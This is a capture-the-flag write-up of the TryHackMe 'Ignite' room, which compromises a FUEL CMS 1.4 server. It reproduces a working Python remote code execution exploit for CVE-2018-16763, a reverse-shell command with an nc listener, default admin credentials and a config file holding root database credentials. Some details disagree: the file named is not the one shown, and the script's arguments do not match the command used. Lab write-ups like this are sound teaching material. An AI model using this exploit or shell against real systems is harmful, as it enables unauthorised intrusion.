# [Ignite THM Room](https://tryhackme.com/room/ignite)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial [ip]
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-23 18:15 BST
Nmap scan report for ip-10-10-49-125.eu-west-1.compute.internal (target-ip)
Host is up (0.00096s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
MAC Address: 02:8C:6F:59:89:71 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

### Gobuster
```
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/23 18:17:29 Starting gobuster
===============================================================
/index (Status: 200)
/home (Status: 200)
/0 (Status: 200)
/assets (Status: 301)
/offline (Status: 200)
```

## Enumeration
- First, we can start by navigating to the IP address through our web browser. When we do, we can find the following:

![Fuel CMS Landing Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/3803c389-7975-47cd-ae50-f4b0d372e152)


- We can visit some directories that were found by our [Gobuster](https://github.com/OJ/gobuster) scan and see if there is any relevant or juicy information.
- The `/index`, `home`, and `0` pages all return the same CMS splash screen. The `/assets` directory returns a 403 Forbidden error. `/offline` takes us to a page that says the service is offline. Nothing particularly interesting here. 
- In the [Nmap](https://nmap.org/) scan, we can see that there is a `robots.txt` file that specifically names a directory that the web developer does not want indexed by web crawlers for search engine purposes. So let's navigate to the `/fuel` directory and see what we can find. 
- When we get there, we can see the following page:

![Fuel CMS Login](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/ed0c56c6-e0dc-477f-b8f1-69f0aed2a03c)


- There are a couple of things worthy of note here. First, we can see that there is a `/login` page in the `/fuel` directory, which means that there could be more. This would be a good place to run another [Gobuster](https://github.com/OJ/gobuster) scan, but now specifying `http://[ip]/fuel` as the target. This will enumerate subdirectories under `/fuel`. The new syntax will look like this:
```
gobuster dir -u http://[ip]/fuel -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip/fuel
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/23 18:33:54 Starting gobuster
===============================================================
/login (Status: 200)
/tools (Status: 302)
/modules (Status: 301)
/users (Status: 302)
/scripts (Status: 403)
/categories (Status: 302)
/assets (Status: 302)
/start (Status: 302)
/tags (Status: 302)
/install (Status: 403)
/navigation (Status: 302)
/Login (Status: 200)
/recent (Status: 302)
/logout (Status: 302)
/blocks (Status: 302)
/preview (Status: 302)
/application (Status: 403)
/Tools (Status: 302)
/module (Status: 302)
/licenses (Status: 301)
/settings (Status: 302)
/logs (Status: 302)
/dashboard (Status: 302)
/login_form (Status: 200)
/permissions (Status: 302)
/Users (Status: 302)
/Assets (Status: 302)
/reset (Status: 302)
/migrate (Status: 302)
/Navigation (Status: 302)
/installer (Status: 302)
/Start (Status: 302)
/Logout (Status: 302)
Progress: 15745 / 220561 (7.14%)
```

- We get a bunch of information, but most redirects us back to the `/login` page. However, if go back to the original splash page we found, there are default credentials outlined in the installation instructions. We can try and use the `admin`/`admin` user/password combination to log into the CMS.

![Fuel CMS Dashboard](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/9eeee079-b037-4f03-a18c-830f0221c10f)


## System Hacking
- After doing some digging and trying to upload different files to get a reverse shell, I found that the version of this CMS is 1.4, which has a remote code execution vulnerability. There is a published proof-of-concept exploit that can be found on [Exploit DB](https://www.exploit-db.com/). I did a little more digging and found an improved python script:

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://target-ip:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

- The source of this script can be found [here](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated). 
- Using the following syntax, I was able to get a shell on the box:
```
python shell.py http://target-ip attacking-ip 8888
```

- On host for reverse shell:
```
nc -lnvp 8888
```

- Now that we have system access, we can grab the user flag.

## Privilege Escalation
- Back on the home page that we first discovered, we can see that there are some instructions regarding configuration. Specifically:
	- "Install the FUEL CMS database by first creating the database in MySQL and then importing the `fuel/install/fuel_schema.sql` file. After creating the database, change the database configuration found in `fuel/application/config/database.php` to include your hostname (e.g. localhost), username, password and the database to match the new database you created."
- We can check out the `/fuel/install/fuel_schema.sql` file and see if there are any relevant credentials. The contents of that file are:
```php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|	['dsn']      The full DSN string describe a connection to the database.
|	['hostname'] The hostname of your database server.
|	['username'] The username used to connect to the database
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
|	['dbdriver'] The database driver. e.g.: mysqli.
|			Currently supported:
|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|	['dbprefix'] You can add an optional prefix, which will be added
|				 to the table name when using the  Query Builder class
|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|	['cache_on'] TRUE/FALSE - Enables/disables query caching
|	['cachedir'] The path to the folder where cache files should be stored
|	['char_set'] The character set used in communicating with the database
|	['dbcollat'] The character collation used in communicating with the database
|				 NOTE: For MySQL and MySQLi databases, this setting is only used
| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|				 (and in table creation queries made with DB Forge).
| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
| 				 can make your site vulnerable to SQL injection if you are using a
| 				 multi-byte character set and are running versions lower than these.
| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
|	['encrypt']  Whether or not to use an encrypted connection.
|
|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|				'ssl_key'    - Path to the private key file
|				'ssl_cert'   - Path to the public key certificate file
|				'ssl_ca'     - Path to the certificate authority file
|				'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|	['compress'] Whether or not to use client compression (MySQL only)
|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|							- good for ensuring strict SQL while developing
|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
|	['failover'] array - A array with 0 or more data for connections if the main should fail.
|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
| 				NOTE: Disabling this will also effectively disable both
| 				$this->db->last_query() and profiling of DB queries.
| 				When you run a query, with this setting set to TRUE (default),
| 				CodeIgniter will store the SQL statement for debugging purposes.
| 				However, this may cause high memory usage, especially if you run
| 				a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
	@include(TESTER_PATH.'config/tester_database'.EXT);
}

```

- Here we can see the `root` username and its password. We can now try to log in to the root user on the machine and get the `root.txt` flag.

## Rabbit Holes
### Encoded String
- When looking at the login page, I completely missed that there were defaults creds on the first page we discovered. Instead, I kept messing around with stuff in the address bar. This was my though process:
- Additionally, there is a long string following the `/login` page. That could be something like a hash or base64 encoded string. We could attempt to crack this with a tool like [Crackstation](https://crackstation.net/) or [John The Ripper](https://www.openwall.com/john/), or try to decode it with something like [CyberChef](https://cyberchef.org/). 
- After checking out [CyberChef](https://cyberchef.org/), we can see that the string following the `/login` page is a base64 encoded one. When decoded, we are given the following: `/login/dashboard`. 
